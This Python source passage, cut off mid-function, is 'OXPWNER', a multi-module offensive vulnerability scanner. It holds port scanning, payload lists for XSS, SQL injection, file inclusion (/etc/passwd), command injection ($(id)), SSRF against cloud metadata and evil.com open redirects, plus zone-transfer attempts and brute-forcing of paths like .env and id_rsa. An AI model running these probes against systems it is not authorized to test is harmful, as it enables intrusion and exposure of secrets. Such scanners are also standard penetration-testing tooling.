# ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
#   OXPWNER
#   Offensive Security & Vulnerability Analysis Engine
#   Author  : Ritik
#   Version : 1.0.0
# ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

import sys
import os
import socket
import ssl
import re
import json
import time
import argparse
import threading
import subprocess
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed


# ─────────────────────────────────────────────
#  ANSI COLOUR PALETTE
# ─────────────────────────────────────────────
class C:
    RST   = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    CYAN  = "\033[38;2;0;255;220m"
    PINK  = "\033[38;2;255;0;128m"
    PURP  = "\033[38;2;180;0;255m"
    GOLD  = "\033[38;2;255;200;0m"
    RED   = "\033[38;2;255;50;50m"
    GRN   = "\033[38;2;0;255;100m"
    WHT   = "\033[38;2;230;230;230m"
    GREY  = "\033[38;2;100;100;120m"


def gradient_line(text, start=(0, 255, 220), end=(255, 0, 128)):
    out = ""
    n = max(len(text) - 1, 1)
    for i, ch in enumerate(text):
        t = i / n
        r = int(start[0] + (end[0] - start[0]) * t)
        g = int(start[1] + (end[1] - start[1]) * t)
        b = int(start[2] + (end[2] - start[2]) * t)
        out += f"\033[38;2;{r};{g};{b}m{ch}"
    return out + C.RST


# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
BANNER_LINES = [
    "    ███████                ███████████                                               ",
    "  ███░░░░░███             ░░███░░░░░███                                              ",
    " ███     ░░███ █████ █████ ░███    ░███ █████ ███ █████ ████████    ██████  ████████ ",
    "░███      ░███░░███ ░░███  ░██████████ ░░███ ░███░░███ ░░███░░███  ███░░███░░███░░███",
    "░███      ░███ ░░░█████░   ░███░░░░░░   ░███ ░███ ░███  ░███ ░███ ░███████  ░███ ░░░ ",
    "░░███     ███   ███░░░███  ░███         ░░███████████   ░███ ░███ ░███░░░   ░███     ",
    " ░░░███████░   █████ █████ █████         ░░████░████    ████ █████░░██████  █████    ",
    "   ░░░░░░░    ░░░░░ ░░░░░ ░░░░░           ░░░░ ░░░░    ░░░░ ░░░░░  ░░░░░░  ░░░░░     "
]

GRADIENT_STEPS = [
    (255, 100, 0),    # Neon Orange
    (255, 50, 50),    # Coral Pink
    (255, 0, 100),    # Magenta Pink
    (255, 0, 150),    # Hot Pink
    (200, 0, 200),    # Deep Purple
    (150, 0, 255),    # Violet
    (100, 50, 255),   # Indigo
    (0, 150, 255),    # Cyber Blue
]


def print_banner():
    os.system("clear" if os.name != "nt" else "cls")
    for i, line in enumerate(BANNER_LINES):
        col = GRADIENT_STEPS[i % len(GRADIENT_STEPS)]
        print(f"\033[38;2;{col[0]};{col[1]};{col[2]}m{C.BOLD}{line}{C.RST}")

    tagline = "  ⚡  Offensive Security & Vulnerability Analysis Engine  ⚡"
    print(gradient_line(tagline))
    print()

    bar = (
        f"  {C.GREY}[{C.RST}{C.CYAN}v1.0.0{C.RST}{C.GREY}]{C.RST}"
        f"  {C.GREY}|{C.RST}"
        f"  {C.GREY}by {C.RST}{C.PINK}Ritik{C.RST}"
        f"  {C.GREY}|{C.RST}"
        f"  {C.GREY}{datetime.now().strftime('%Y-%m-%d  %H:%M')}{C.RST}"
        f"  {C.GREY}|{C.RST}"
        f"  {C.GRN}ARMED & READY{C.RST}"
    )
    print(bar)
    print(f"\n  {C.GREY}{'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'}{C.RST}\n")


# ─────────────────────────────────────────────
#  LOGGER
# ─────────────────────────────────────────────
class Logger:
    @staticmethod
    def _ts():
        return f"{C.GREY}• {datetime.now().strftime('%H:%M:%S')} {C.RST}"

    @staticmethod
    def info(msg):
        print(f"  {Logger._ts()} {C.CYAN}⟴{C.RST}  {C.WHT}{msg}{C.RST}")

    @staticmethod
    def ok(msg):
        print(f"  {Logger._ts()} {C.GRN}✓{C.RST}  {C.GRN}{msg}{C.RST}")

    @staticmethod
    def warn(msg):
        print(f"  {Logger._ts()} {C.GOLD}⚠{C.RST}  {C.GOLD}{msg}{C.RST}")

    @staticmethod
    def vuln(msg):
        print(f"  {Logger._ts()} {C.RED}☢ VULN{C.RST} {C.RED}{C.BOLD}{msg}{C.RST}")

    @staticmethod
    def fail(msg):
        print(f"  {Logger._ts()} {C.PINK}✖{C.RST}  {C.GREY}{msg}{C.RST}")

    @staticmethod
    def section(title):
        bar = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        print(f"\n  {C.PURP}{bar}{C.RST}")
        print(f"  {C.BOLD}{C.CYAN}///  {title.upper():<48} ///{C.RST}")
        print(f"  {C.PURP}{bar}{C.RST}\n")


log = Logger()


# ─────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────
def resolve_host(target):
    try:
        return socket.gethostbyname(target)
    except socket.gaierror:
        return None


def make_request(url, timeout=8, headers=None):
    req_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Accept": "*/*",
    }
    if headers:
        req_headers.update(headers)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url, headers=req_headers)
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read(65536).decode("utf-8", errors="replace")
        return resp, body
    except Exception as e:
        return None, str(e)


def save_report(data, filename):
    with open(filename, "w") as f:
        json.dump(data, f, indent=2, default=str)
    log.ok(f"Report saved -> {filename}")


# ─────────────────────────────────────────────
#  MODULE 1 — PORT SCANNER
# ─────────────────────────────────────────────
COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
    53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 3306: "MySQL", 3389: "RDP",
    5432: "PostgreSQL", 6379: "Redis", 8080: "HTTP-Alt",
    8443: "HTTPS-Alt", 27017: "MongoDB", 5900: "VNC",
    11211: "Memcached", 9200: "Elasticsearch",
}


def scan_port(host, port, timeout=0.2):
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            banner = ""
            try:
                s.settimeout(0.1)
                banner = s.recv(256).decode("utf-8", errors="replace").strip()
            except Exception:
                pass
            return port, True, banner
    except Exception:
        return port, False, ""


def port_scan(host, ports=None, threads=100):
    log.section("PORT SCANNER")
    ip = resolve_host(host)
    if not ip:
        log.fail(f"Cannot resolve {host}")
        return {}
    log.info(f"Target: {host}  ({ip})")
    port_list = ports or list(range(1, 65536))
    log.info(f"Scanning {len(port_list)} ports ...")
    results = {}

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(scan_port, ip, p): p for p in port_list}
        for fut in as_completed(futures):
            port, open_, banner = fut.result()
            if open_:
                svc = COMMON_PORTS.get(port, "unknown")
                results[port] = {"service": svc, "banner": banner}
                bstr = f"  banner={banner[:40]!r}" if banner else ""
                log.ok(f"Port {port:>5}/tcp  OPEN  {svc:<14}{bstr}")

    if not results:
        log.fail("No open ports found.")
    return results


# ─────────────────────────────────────────────
#  MODULE 2 — URL VULNERABILITY SCANNER
# ─────────────────────────────────────────────
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
]

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--",
    "\" OR \"1\"=\"1", "1' ORDER BY 1--",
    "1 UNION SELECT NULL--", "' AND SLEEP(2)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
    "admin' --", "admin' #", "' OR 'x'='x",
    "1' OR 1=1 LIMIT 1-- -", "1) OR (1=1)--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-01756",
    "unclosed quotation", "odbc drivers", "sqlite3",
    "pg_query", "warning: pg_", "syntax error",
    "microsoft ole db", "incorrect syntax",
    "mysql_error", "ora-00933", "postgresql query failed",
    "sqlcmd", "database error",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
    "/etc/passwd",
    "../../../../../../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "C:/Windows/win.ini",
    "../../../../../../../../windows/win.ini",
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com", "https://evil.com",
    "//evil.com/%2F..", "///evil.com",
    "http://evil.com",
    "\\/evil.com",
    "/%09/evil.com",
    "https://example.com@evil.com",
]

CMD_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "& id",
    "`id`",
    "$(id)",
    "| whoami",
    ";whoami",
    "`whoami`",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://0.0.0.0",
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/stat",
]


def extract_params(url):
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return parsed, params


def inject_param(parsed, params, key, value):
    new_params = dict(params)
    new_params[key] = [value]
    new_query = urllib.parse.urlencode(new_params, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


def test_xss(url, params, parsed):
    findings = []
    for key in params:
        for payload in XSS_PAYLOADS:
            test_url = inject_param(parsed, params, key, payload)
            _, body = make_request(test_url, timeout=6)
            if payload in body:
                findings.append({"type": "XSS", "param": key, "payload": payload, "url": test_url})
                log.vuln(f"XSS -> param={key}  payload={payload[:40]}")
    return findings


def test_sqli(url, params, parsed):
    findings = []
    for key in params:
        for payload in SQLI_PAYLOADS:
            test_url = inject_param(parsed, params, key, payload)
            _, body = make_request(test_url, timeout=8)
            body_lower = body.lower()
            for err in SQLI_ERRORS:
                if err in body_lower:
                    findings.append({"type": "SQLi", "param": key, "payload": payload,
                                     "error_keyword": err, "url": test_url})
                    log.vuln(f"SQL Injection -> param={key}  trigger={err!r}")
                    break
    return findings


def test_lfi(url, params, parsed):
    findings = []
    for key in params:
        for payload in LFI_PAYLOADS:
            test_url = inject_param(parsed, params, key, payload)
            _, body = make_request(test_url, timeout=6)
            if "root:x:" in body or "bin/bash" in body or "daemon:" in body:
                findings.append({"type": "LFI", "param": key, "payload": payload, "url": test_url})
                log.vuln(f"LFI -> param={key}  payload={payload}")
    return findings


def test_open_redirect(url, params, parsed):
    findings = []
    for key in params:
        for payload in OPEN_REDIRECT_PAYLOADS:
            test_url = inject_param(parsed, params, key, payload)
            resp, _ = make_request(test_url, timeout=6)
            if resp:
                loc = resp.headers.get("Location", "")
                if "evil.com" in loc:
                    findings.append({"type": "OpenRedirect", "param": key,
                                     "payload": payload, "url": test_url})
                    log.vuln(f"Open Redirect -> param={key}  Location={loc}")
    return findings


def test_cmd_injection(url, params, parsed):
    findings = []
    for key in params:
        for payload in CMD_INJECTION_PAYLOADS:
            test_url = inject_param(parsed, params, key, payload)
            _, body = make_request(test_url, timeout=8)
            # `id` often outputs uid=... gid=...
            # `whoami` often outputs a single user like root/www-data/etc.
            if "uid=" in body and "gid=" in body:
                findings.append({"type": "CmdInjection", "param": key, "payload": payload, "url": test_url})
                log.vuln(f"OS Command Injection -> param={key}  payload={payload}")
                break # Avoid duplicating reports if both 'id' and 'whoami' payloads work
    return findings


def test_ssrf(url, params, parsed):
    findings = []
    for key in params:
        for payload in SSRF_PAYLOADS:
            test_url = inject_param(parsed, params, key, payload)
            _, body = make_request(test_url, timeout=10)
            # Looking for typical metadata or local resource responses
            if "ami-id" in body or "instance-id" in body or "root:x:0:0:" in body:
                findings.append({"type": "SSRF", "param": key, "payload": payload, "url": test_url})
                log.vuln(f"SSRF (Server-Side Request Forgery) -> param={key}  payload={payload}")
    return findings


def test_security_headers(url):
    log.info("Checking HTTP security headers ...")
    resp, _ = make_request(url)
    if not resp:
        log.fail("Could not fetch URL for header analysis.")
        return {}
    headers = {k.lower(): v for k, v in dict(resp.headers).items()}
    EXPECTED = {
        "Strict-Transport-Security": "HSTS missing — protocol downgrade risk",
        "X-Content-Type-Options":    "X-Content-Type-Options missing — MIME sniff risk",
        "X-Frame-Options":           "X-Frame-Options missing — clickjacking risk",
        "Content-Security-Policy":   "CSP missing — XSS / injection risk",
        "Referrer-Policy":           "Referrer-Policy missing — info leakage risk",
        "Permissions-Policy":        "Permissions-Policy missing — feature abuse risk",
    }
    issues = {}
    for h, msg in EXPECTED.items():
        if h.lower() not in headers:
            log.warn(msg)
            issues[h] = msg
        else:
            log.ok(f"  {h} OK")
    return issues


def test_ssl_tls(host, port=443):
    log.info("Checking SSL/TLS configuration ...")
    issues = []
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as tls:
                cert   = tls.getpeercert()
                proto  = tls.version()
                cipher = tls.cipher()
                log.ok(f"TLS version : {proto}")
                log.ok(f"Cipher      : {cipher[0]}")
                exp = cert.get("notAfter", "")
                if exp:
                    exp_dt = datetime.strptime(exp, "%b %d %H:%M:%S %Y %Z")
                    days = (exp_dt - datetime.now(timezone.utc).replace(tzinfo=None)).days
                    if days < 30:
                        log.warn(f"Certificate expires in {days} days!")
                        issues.append(f"Cert expiry in {days} days")
                    else:
                        log.ok(f"Cert valid for {days} more days")
                if proto in ("TLSv1", "TLSv1.1", "SSLv2", "SSLv3"):
                    log.vuln(f"Weak TLS version in use: {proto}")
                    issues.append(f"Weak TLS: {proto}")
    except Exception as e:
        log.fail(f"SSL check failed: {e}")
    return issues


def scan_url(url):
    log.section("URL VULNERABILITY SCAN")
    log.info(f"Target URL: {url}")
    parsed, params = extract_params(url)
    all_findings = []

    if not params:
        log.warn("No query parameters found. Injecting ?id=1 for demonstration.")
        url += ("&" if "?" in url else "?") + "id=1"
        parsed, params = extract_params(url)

    log.info(f"Parameters detected: {list(params.keys())}")
    print()

    log.info("Testing Cross-Site Scripting (XSS) ...")
    all_findings += test_xss(url, params, parsed)

    log.info("Testing SQL Injection ...")
    all_findings += test_sqli(url, params, parsed)

    log.info("Testing Local File Inclusion (LFI) ...")
    all_findings += test_lfi(url, params, parsed)

    log.info("Testing OS Command Injection ...")
    all_findings += test_cmd_injection(url, params, parsed)
    
    log.info("Testing SSRF (Server-Side Request Forgery) ...")
    all_findings += test_ssrf(url, params, parsed)

    log.info("Testing Open Redirect ...")
    all_findings += test_open_redirect(url, params, parsed)

    print()
    host = parsed.hostname
    test_security_headers(url)
    print()
    if parsed.scheme == "https":
        test_ssl_tls(host)

    return all_findings


# ─────────────────────────────────────────────
#  MODULE 3 — SUBDOMAIN ENUMERATOR
# ─────────────────────────────────────────────
SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "admin", "api", "dev", "test", "staging", "beta",
    "app", "portal", "vpn", "remote", "secure", "mx", "ns", "ns1", "ns2",
    "blog", "shop", "store", "forum", "support", "help", "status", "cdn",
    "media", "img", "images", "assets", "static", "docs", "wiki", "git",
    "jenkins", "ci", "jira", "gitlab", "auth", "login", "sso", "dashboard",
    "panel", "manage", "monitor", "metrics", "grafana", "kibana", "es",
    "syslog", "web", "mysql", "db", "sql", "oracle", "backend", "frontend",
    "api-dev", "api-stg", "api-prod", "uat", "qaqa", "qamain", "alpha", 
    "sandbox", "demo", "partner", "partners", "b2b", "agent", "connect",
    "intranet", "local", "corp", "corps", "gw", "gateway", "edge", "proxy",
    "vpn1", "vpn2", "cpanel", "whm", "webmail", "smtp", "pop3", "imap",
    "exchange", "owa", "autodiscover", "webdisk", "ftp1", "ftp2", "sftp",
    "download", "downloads", "files", "update", "updates", "up", "pkg",
    "repo", "repos", "apt", "yum", "registry", "docker", "k8s", "kubernetes",
    "cluster", "node", "nexus", "artifactory", "sonar", "sonarqube", "travis",
    "circleci", "nagios", "zabbix", "prometheus", "alertmanager", "splunk",
    "elk", "log", "logs", "logging", "search", "elastic", "solr", "chat",
    "talk", "xmpp", "jabber", "slack", "mattermost", "irc", "voice", "sip",
    "voip", "pbx", "asterisk", "video", "meet", "meeting", "zoom", "webex",
    "tv", "live", "stream", "streaming", "cdn1", "cdn2", "media1", "media2",
    "content", "assets1", "assets2", "static1", "static2", "cache", "redis",
    "memcached", "mc", "cache1", "cache2", "mq", "rabbitmq", "kafka", "amqp",
    "mqtt", "iot", "device", "devices", "sensor", "sensors", "pi", "home",
    "smart", "cloud", "aws", "azure", "gcp", "host", "hosting", "server",
    "srv", "vm", "vps", "box", "node1", "node2", "master", "slave", "worker",
    "dns", "dns1", "dns2", "ns3", "ns4", "nameserver", "ntp", "time", "clock",
    "fw", "firewall", "router", "switch", "vpn-gw", "wlc", "wifi", "guest",
    "public", "private", "internal", "external", "corp-vpn", "admin-panel",
    "root", "sysadmin", "it", "support-portal", "helpdesk", "ticket", "tickets",
    "billing", "pay", "payment", "checkout", "cart", "shop-admin", "erp",
    "crm", "hr", "payroll", "finance", "accounting", "administer", "control",
    "webadmin", "siteadmin", "administrator", "sysadmin", "staff", "employees",
    "webmaster", "postmaster", "hostmaster", "abuse", "noc", "soc", "cert",
    "security", "sec", "audit", "compliance", "legal", "privacy", "terms", "policy",
    "about", "contact", "info", "press", "news", "pr", "media-kit", "investors",
    "careers", "jobs", "work", "team", "board", "exec", "management", "directors",
    "affiliates", "resellers", "distributors", "vendors", "suppliers",
    "clients", "customers", "users", "members", "community", "boards",
    "discuss", "groups", "mailing", "lists", "newsletter", "subscribe", "unsubscribe",
    "optout", "optin", "preferences", "settings", "profile", "account", "my",
    "myaccount", "controlpanel", "plesk", "directadmin",
    "webmin", "virtualmin", "ispconfig", "frozx", "vesta", "cyberpanel", "aapanel",
    "register", "signup", "signin", "signout", "logout", "reset",
    "recover", "forgot", "password", "oauth", "saml", "idp", "sts",
    "adfs", "radius", "tacacs", "ldap", "active", "directory", "kerberos",
]


def enumerate_subdomains(domain, threads=100):
    log.section("SUBDOMAIN ENUMERATOR")
    log.info(f"Domain: {domain}  |  wordlist: {len(SUBDOMAIN_WORDLIST)} entries")
    found = []

    def check(sub):
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            return fqdn, ip
        except Exception:
            return None, None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(check, s): s for s in SUBDOMAIN_WORDLIST}
        for fut in as_completed(futures):
            fqdn, ip = fut.result()
            if fqdn:
                log.ok(f"  {fqdn:<40} -> {ip}")
                found.append({"subdomain": fqdn, "ip": ip})

    if not found:
        log.fail("No subdomains resolved.")
    return found


# ─────────────────────────────────────────────
#  MODULE 4 — NETWORK VULNERABILITY SCANNER
# ─────────────────────────────────────────────
DANGEROUS_PORTS = {
    21:    "FTP  — anonymous login often enabled",
    22:    "SSH  — brute-force/credential stuffing target",
    23:    "Telnet — plaintext credential exposure",
    445:   "SMB  — EternalBlue / ransomware target",
    1433:  "MSSQL — direct database exposure / SA brute-force",
    1521:  "Oracle DB — direct data exposure risk",
    2049:  "NFS  — insecure file sharing / unrestricted mounts",
    2375:  "Docker API — unauthenticated container takeover!",
    2376:  "Docker API (TLS) — container exposure risk",
    3306:  "MySQL — direct database exposure",
    3389:  "RDP  — BlueKeep / brute-force risk",
    5432:  "PostgreSQL — direct database exposure",
    5900:  "VNC  — no auth / weak password risk",
    5984:  "CouchDB — unauthenticated data exposure",
    6379:  "Redis — unauthenticated by default",
    8080:  "HTTP-Alt — often hosts unsecured admin panels (Jenkins, Tomcat)",
    8443:  "HTTPS-Alt — admin interfaces exposure",
    9200:  "Elasticsearch — no auth by default",
    10050: "Zabbix Agent — potential RCE via misconfiguration",
    11211: "Memcached — DDoS amplification risk / no auth",
    27017: "MongoDB — unauthenticated by default",
}


def check_anonymous_ftp(host):
    try:
        import ftplib
        ftp = ftplib.FTP(timeout=5)
        ftp.connect(host, 21)
        ftp.login("anonymous", "anonymous@")
        ftp.quit()
        return True
    except Exception:
        return False


def check_redis_unauth(host):
    try:
        with socket.create_connection((host, 6379), timeout=3) as s:
            s.send(b"PING\r\n")
            resp = s.recv(64).decode("utf-8", errors="replace")
            return "+PONG" in resp
    except Exception:
        return False


def network_vuln_scan(host, open_ports):
    log.section("NETWORK VULNERABILITY ANALYSIS")
    vulns = []
    for port, info in open_ports.items():
        if port in DANGEROUS_PORTS:
            msg = DANGEROUS_PORTS[port]
            log.warn(f"High-risk port {port} open — {msg}")
            entry = {"port": port, "risk": msg}
            if port == 21 and check_anonymous_ftp(host):
                log.vuln(f"Anonymous FTP login ACCEPTED on {host}:21")
                entry["critical"] = "Anonymous FTP enabled"
            if port == 6379 and check_redis_unauth(host):
                log.vuln(f"Redis is UNAUTHENTICATED on {host}:6379")
                entry["critical"] = "Unauthenticated Redis"
            vulns.append(entry)
    if not vulns:
        log.ok("No critical network-level vulnerabilities in open ports.")
    return vulns


# ─────────────────────────────────────────────
#  MODULE 5 — DNS RECON
# ─────────────────────────────────────────────
def dns_recon(domain):
    log.section("DNS RECONNAISSANCE")
    records = {}

    def query(rtype, target=domain):
        try:
            result = subprocess.check_output(
                ["dig", "+short", rtype, target],
                stderr=subprocess.DEVNULL, timeout=5
            ).decode().strip().splitlines()
            return [r.strip() for r in result if r.strip()]
        except Exception:
            return []

    # 1. Broad query for all common record types
    EXTENSIVE_RECORDS = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "CAA"]
    for rtype in EXTENSIVE_RECORDS:
        vals = query(rtype)
        if vals:
            records[rtype] = vals
            for v in vals:
                log.ok(f"  {rtype:<8} {v}")
        else:
            log.fail(f"  {rtype:<8} (none)")

    # 2. Extract SPF weaknesses from TXT records
    spf_found = False
    for txt in records.get("TXT", []):
        if "v=spf1" in txt.lower():
            spf_found = True
            if "+all" in txt.lower():
                log.vuln(f"SPF Policy allows ANY IP to spoof emails (+all) -> {txt}")
            elif "~all" in txt.lower():
                log.warn(f"SPF Policy is SOFTFAIL (~all), spoofing may still be possible -> {txt}")
            else:
                log.ok(f"  SPF OK  {txt[:50]}...")
    if not spf_found:
        log.warn("No SPF record found! Email spoofing highly likely.")

    # 3. Dedicated DMARC query
    dmarc_vals = query("TXT", f"_dmarc.{domain}")
    dmarc_found = False
    for dmarc in dmarc_vals:
        if "v=DMARC1" in dmarc.upper():
            dmarc_found = True
            if "p=none" in dmarc.lower():
                log.warn(f"DMARC Policy is NONE (p=none) -> {dmarc}")
            else:
                log.ok(f"  DMARC OK {dmarc}")
            records["DMARC"] = dmarc_vals
    if not dmarc_found:
        log.warn("No DMARC record found! Domain is vulnerable to phishing attacks.")

    # 4. Exhaustive Zone Transfer attempt on ALL discovered Name Servers
    all_ns = records.get("NS", [])
    if not all_ns:
        # Fallback to SOA if NS wasn't populated
        for soa in records.get("SOA", []):
            ns = soa.split()[0]
            if ns not in all_ns:
                all_ns.append(ns)

    records["zone_transfer"] = []
    for ns in all_ns:
        ns = ns.rstrip(".")
        if not ns: continue
        log.info(f"Attempting AXFR Zone Transfer against {ns} ...")
        try:
            out = subprocess.check_output(
                ["dig", "AXFR", domain, f"@{ns}"],
                stderr=subprocess.DEVNULL, timeout=8
            ).decode()
            if "Transfer failed" not in out and "XFR size" in out:
                log.vuln(f"ZONE TRANSFER SUCCESSFUL via {ns}!!! Dumped domain database.")
                records["zone_transfer"].append(ns)
            else:
                log.fail(f"  AXFR Failed on {ns}")
        except Exception:
            log.fail(f"  AXFR Request Timed Out on {ns}")

    return records


# ─────────────────────────────────────────────
#  MODULE 6 — DIRECTORY BRUTEFORCE
# ─────────────────────────────────────────────
DIR_WORDLIST = [
    "admin", "login", "dashboard", "api", "api/v1", "api/v2", "api/v3", "graphql", "swagger-ui.html", "swagger", 
    "api-docs", "config", "backup", ".git", ".git/config", ".env", ".env.example", ".env.backup", ".env.dev",
    "wp-admin", "wp-content/uploads", "phpmyadmin", "manager", "console", "shell", "cmd",
    "upload", "uploads", "files", "db", "database", "server-status", "actuator/env", "actuator/health",
    "robots.txt", "sitemap.xml", "web.config", "readme.txt", "CHANGELOG.md", "docker-compose.yml",
    "info.php", "test.php", "phpinfo.php", "install", "setup", ".htaccess", "crossdomain.xml",
    "cgi-bin", "scripts", "includes", "src", "vendor", "node_modules", ".DS_Store", "id_rsa", "id_rsa.pub",
    "backup.sql", "dump.sql", "db.sql", "data.sql", "admin.php", "login.php", "config.php", "wp-config.php",
    "old", "new", "test", "dev", "beta", "v1", "v2", "v3", "public", "private", "secret", "hidden",
]

SENSITIVE_PATHS = {
    ".git", ".git/config", ".env", ".env.backup", "web.config", "backup.sql", "dump.sql", "db.sql",
    "wp-config.php", "config.php", "id_rsa", ".DS_Store", "phpinfo.php", "actuator/env", "docker-compose.yml"
}


def dir_bruteforce(base_url, threads=100):
    log.section("DIRECTORY BRUTEFORCE")
    log.info(f"Base URL: {base_url}  |  paths: {len(DIR_WORDLIST)}")
    base_url = base_url.rstrip("/")
    found = []

    # Wildcard catch (check if server returns 200 for everything)
    wildcard_url = f"{base_url}/this_should_never_exist_1337"
    w_resp, w_body = make_request(wildcard_url, timeout=5)
    wildcard_200 = w_resp and w_resp.status == 200
    baseline_length = len(w_body) if wildcard_200 else 0
    if wildcard_200:
        log.warn("WILDCARD 200 DETECTED! Server returns OK for random paths. Filtering by body length.")

    def check(path):
        url = f"{base_url}/{path}"
        resp, body = make_request(url, timeout=5)
        if resp and resp.status in (200, 201, 301, 302, 403):
            # If wildcard 200 is true, only accept if the body length changed significantly (e.g. >20 bytes diff)
            if wildcard_200 and resp.status == 200 and abs(len(body) - baseline_length) < 20:
                return None, None, None
            return path, resp.status, len(body)
        return None, None, None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(check, p): p for p in DIR_WORDLIST}
        for fut in as_completed(futures):
            path, code, length = fut.result()
            if path:
                colour = C.GRN if code == 200 else C.GOLD if code in (403, 301, 302) else C.CYAN
                log.ok(f"  [{colour}{code}{C.RST}]  /{path:<30}  ({length} bytes)")
                found.append({"path": path, "status": code, "bytes": length})
                if path in SENSITIVE_PATHS:
                    log.vuln(f"SENSITIVE PATH LEAK REPORTED: /{path}")

    if not found:
        log.fail("No interesting paths found.")
    return found


# ─────────────────────────────────────────────
#  MODULE 7 — TECHNOLOGY FINGERPRINT
# ─────────────────────────────────────────────
TECH_SIGNATURES = {
    # CMS & Ecommerce Systems
    "WordPress":  ["wp-content", "wp-includes", "<meta name=\"generator\" content=\"WordPress"],
    "Joomla":     ["Joomla!", "/components/com_", "<meta name=\"generator\" content=\"Joomla"],
    "Drupal":     ["Drupal.settings", "/sites/default/", "<meta name=\"generator\" content=\"Drupal"],
    "Magento":    ["mage/cookies.js", "Mage.Cookies", "text/x-magento-init"],
    "Shopify":    ["cdn.shopify.com", "Shopify.theme"],
    "Ghost":      ["<meta name=\"generator\" content=\"Ghost"],
    
    # Programming Languages
    "PHP":        ["X-Powered-By: PHP", ".php", "PHPSESSID"],
    "ASP.NET":    ["X-Powered-By: ASP.NET", "ASP.NET_SessionId", "__VIEWSTATE"],
    "Java":       ["JSESSIONID", "X-Powered-By: Servlet", "X-Powered-By: JSP"],
    "Python":     ["Server: Werkzeug", "Server: gunicorn", "Server: Waitress"],
    "Ruby":       ["X-Rack-Cache", "X-Runtime: Ruby", "_session_id"],
    "Node.js":    ["X-Powered-By: Express", "Server: Node"],
    
    # Web Frameworks
    "Django":     ["csrftoken", "csrfmiddlewaretoken"],
    "Laravel":    ["laravel_session", "XSRF-TOKEN", "X-Powered-By: Laravel"],
    "Spring Boot":["Whitelabel Error Page", "X-Application-Context: application"],
    "Flask":      ["Server: Werkzeug", "flask.session"],
    "Ruby on Rails": ["X-Powered-By: Phusion Passenger", "rails_admin", "authenticity_token"],
    
    # Frontend Libraries / JS Frameworks
    "jQuery":     ["jquery.min.js", "jQuery v", "jquery.js"],
    "Bootstrap":  ["bootstrap.min.css", "Bootstrap", "bootstrap.js"],
    "React":      ["react.development.js", "__reactFiber", "data-reactroot", "__REACT_DEVTOOLS"],
    "Vue.js":     ["vue.min.js", "Vue.js", "__VUE", "data-v-"],
    "Angular":    ["ng-app", "ng-controller", "ng-version"],
    "Svelte":     ["__svelte", "svelte-"],
    "Next.js":    ["_next/static", "__NEXT_DATA__", "x-nextjs-cache"],
    "Nuxt.js":    ["__NUXT__", "_nuxt/"],
    "Tailwind":   ["tailwind.config.js", "tailwindcss"],
    
    # Web Servers
    "nginx":      ["Server: nginx"],
    "Apache":     ["Server: Apache"],
    "Microsoft IIS":["Server: Microsoft-IIS"],
    "LiteSpeed":  ["Server: LiteSpeed"],
    "Caddy":      ["Server: Caddy"],
    
    # Infrastructure / Cloud / WAF
    "Cloudflare": ["CF-RAY", "cloudflare", "cf-cache-status", "Server: cloudflare"],
    "AWS":        ["Server: AmazonS3", "x-amz-request-id", "x-amz-cf-id", "AWSALB", "AWSELB"],
    "Akamai":     ["X-Akamai-Edgescape", "AkamaiGHost"],
    "Fastly":     ["X-Fastly-Request-ID", "Fastly-"],
    "Varnish":    ["X-Varnish", "Via: 1.1 varnish"],
    
    # Analytics
    "Google Analytics": ["google-analytics.com/analytics.js", "gtag("],
}


def tech_fingerprint(url):
    log.section("TECHNOLOGY FINGERPRINT")
    resp, body = make_request(url)
    if not resp:
